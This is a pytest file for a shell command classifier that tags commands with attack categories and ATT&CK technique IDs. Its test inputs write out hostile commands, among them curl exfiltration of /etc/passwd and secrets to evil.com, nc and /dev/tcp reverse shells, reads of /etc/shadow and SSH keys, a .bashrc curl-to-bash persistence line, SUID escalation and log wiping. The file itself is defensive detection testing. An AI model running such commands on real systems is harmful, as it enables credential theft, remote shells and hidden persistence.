# SPDX-License-Identifier: Apache-2.0
# Copyright (C) 2026 Red Hat, Inc.
"""Tests for shell command classifier."""

import pytest

from audit.shell_classifier import Classification, classify, classify_log


class TestExfiltration:
    def test_curl_post(self):
        c = classify("curl -X POST https://evil.com/exfil -d @/etc/passwd")
        assert c.category == "exfiltration"
        assert c.severity == "HIGH"
        assert c.technique_id == "T1048"

    def test_base64_pipe_to_curl(self):
        c = classify("cat secret.txt | base64 | curl -X POST -d @- https://c2.example.com")
        assert c.category == "exfiltration"
        assert c.severity == "HIGH"

    def test_netcat_reverse_shell(self):
        c = classify("nc -e /bin/bash 10.0.0.1 4444")
        assert c.category == "exfiltration"
        assert c.severity == "HIGH"

    def test_scp_transfer(self):
        c = classify("scp /etc/krb5.keytab attacker@remote:/tmp/")
        assert c.category == "exfiltration"
        assert c.severity == "HIGH"

    def test_bash_dev_tcp(self):
        c = classify("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
        assert c.category == "exfiltration"
        assert c.severity == "HIGH"

    def test_dns_tunneling(self):
        c = classify("dig TXT data.evil.com")
        assert c.category == "exfiltration"
        assert c.technique_id == "T1048.003"


class TestCredentialAccess:
    def test_cat_shadow(self):
        c = classify("cat /etc/shadow")
        assert c.category == "credential_access"
        assert c.severity == "HIGH"
        assert c.technique_id == "T1003.008"

    def test_cat_keytab(self):
        c = classify("cat /etc/krb5.keytab")
        assert c.category == "credential_access"
        assert c.technique_id == "T1558"

    def test_proc_environ(self):
        c = classify("cat /proc/1234/environ")
        assert c.category == "credential_access"

    def test_find_pem_files(self):
        c = classify("find / -name '*.pem'")
        assert c.category == "credential_access"
        assert c.technique_id == "T1552.004"

    def test_cat_ssh_private_key(self):
        c = classify("cat ~/.ssh/id_rsa")
        assert c.category == "credential_access"

    def test_grep_password(self):
        c = classify("grep -r password /etc/")
        assert c.category == "credential_access"
        assert c.technique_id == "T1552.001"

    def test_sssd_secrets(self):
        c = classify("cat /var/lib/sssd/secrets.ldb")
        assert c.category == "credential_access"


class TestPersistence:
    def test_systemctl_enable(self):
        c = classify("systemctl enable backdoor.service")
        assert c.category == "persistence"
        assert c.technique_id == "T1543.002"

    def test_crontab_edit(self):
        c = classify("crontab -e")
        assert c.category == "persistence"
        assert c.technique_id == "T1053.003"

    def test_bashrc_append(self):
        c = classify("echo 'curl http://c2.bad/shell.sh | bash' >> ~/.bashrc")
        assert c.category == "persistence"
        assert c.technique_id == "T1546.004"

    def test_rc_local(self):
        c = classify("echo '/tmp/agent' >> /etc/rc.local")
        assert c.category == "persistence"
        assert c.technique_id == "T1037.004"

    def test_copy_systemd_unit(self):
        c = classify("cp /tmp/evil.service /etc/systemd/system/evil.service")
        assert c.category == "persistence"

    def test_at_job(self):
        c = classify("at 2am <<< '/tmp/payload'")
        assert c.category == "persistence"
        assert c.technique_id == "T1053.001"


class TestPrivilegeEscalation:
    def test_chmod_suid(self):
        c = classify("chmod u+s /tmp/shell")
        assert c.category == "privilege_escalation"
        assert c.technique_id == "T1548.001"

    def test_chmod_suid_numeric(self):
        c = classify("chmod 4755 /tmp/shell")
        assert c.category == "privilege_escalation"

    def test_ld_preload(self):
        c = classify("LD_PRELOAD=/tmp/evil.so /usr/bin/passwd")
        assert c.category == "privilege_escalation"
        assert c.technique_id == "T1574.006"

    def test_setcap(self):
        c = classify("setcap cap_setuid+ep /tmp/python3")
        assert c.category == "privilege_escalation"

    def test_pkexec(self):
        c = classify("pkexec /bin/bash")
        assert c.category == "privilege_escalation"

    def test_sudo_suspicious(self):
        c = classify("sudo bash -c 'echo pwned'")
        assert c.category == "privilege_escalation"


class TestDefenseEvasion:
    def test_history_clear(self):
        c = classify("history -c")
        assert c.category == "defense_evasion"
        assert c.technique_id == "T1070.003"

    def test_unset_histfile(self):
        c = classify("unset HISTFILE")
        assert c.category == "defense_evasion"

    def test_overwrite_log(self):
        c = classify("echo '' > /var/log/auth.log")
        assert c.category == "defense_evasion"
        assert c.technique_id == "T1070.002"

    def test_timestomp(self):
        c = classify("touch -t 202001010000 /tmp/backdoor")
        assert c.category == "defense_evasion"
        assert c.technique_id == "T1070.006"

    def test_process_name_spoof(self):
        c = classify("exec -a httpd /tmp/malware")
        assert c.category == "defense_evasion"
        assert c.technique_id == "T1036.004"


class TestDiscovery:
    def test_whoami(self):
        c = classify("whoami")
        assert c.category == "discovery"
        assert c.severity == "LOW"

    def test_cat_passwd(self):
        c = classify("cat /etc/passwd")
        assert c.category == "discovery"

    def test_ip_addr(self):
        c = classify("ip addr")
        assert c.category == "discovery"

    def test_netstat(self):
        c = classify("netstat -tlnp")
        assert c.category == "discovery"

    def test_ps(self):
        c = classify("ps aux")
        assert c.category == "discovery"


class TestRoutine:
    def test_ls(self):
        c = classify("ls -la")
        assert c.category == "routine"
        assert c.severity == "NONE"

    def test_grep_normal(self):
        c = classify("grep -r 'TODO' src/")
        assert c.category == "routine"

    def test_systemctl_status(self):
        c = classify("systemctl status sshd")
        assert c.category == "routine"

    def test_dnf_install(self):
        c = classify("dnf install -y httpd")
        assert c.category == "routine"

    def test_empty_command(self):
        c = classify("")
        assert c.category == "routine"
        assert c.severity == "NONE"

    def test_cat_normal_file(self):
        c = classify("cat /tmp/notes.txt")
        assert c.category == "routine"


class TestEdgeCases:
    def test_pipe_chain_highest_wins(self):
        """Exfiltration pattern in a pipe should match exfiltration, not discovery."""
        c = classify("whoami | curl -X POST -d @- https://evil.com")
        assert c.category == "exfiltration"

    def test_subshell(self):
        c = classify("$(cat /etc/shadow)")
        assert c.category == "credential_access"

    def test_benign_with_scary_name(self):
        """A file called 'shadow-utils' isn't credential access."""
        c = classify("rpm -q shadow-utils")
        assert c.category == "routine"

    def test_sudo_cat_is_not_suspicious(self):
        """sudo cat is routine (the regex explicitly exempts it)."""
        c = classify("sudo cat /var/log/messages")
        assert c.category == "routine"

    def test_sudo_ls_is_not_suspicious(self):
        c = classify("sudo ls /root")
        assert c.category == "routine"


class TestBatch:
    def test_classify_log(self):
        cmds = ["ls", "cat /etc/shadow", "whoami"]
        results = classify_log(cmds)
        assert len(results) == 3
        assert results[0].category == "routine"
        assert results[1].category == "credential_access"
        assert results[2].category == "discovery"

    def test_classify_log_empty(self):
        assert classify_log([]) == []
